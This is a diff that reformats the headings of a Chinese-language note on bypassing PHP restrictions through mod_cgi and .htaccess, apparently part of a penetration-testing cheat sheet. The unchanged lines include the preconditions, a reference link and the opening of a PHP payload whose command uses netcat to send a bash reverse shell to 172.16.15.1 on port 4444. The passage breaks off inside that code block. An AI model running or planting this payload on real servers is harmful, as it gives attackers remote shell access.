@@ -1,13 +1,16 @@
-## CGI绕过
-利用条件：
+# CGI绕过
+#### 利用条件
+
 - 开启了cgi
 - 目录可写
 - .htaccess文件可用
 
-参考：
+#### 参考
+
 - http://0cx.cc/bypass_disabled_via_mod_cgi.jspx
 
-payload:
+#### payload
+
 ```php
 <?php
 $cmd = "nc -c '/bin/bash' 172.16.15.1 4444";
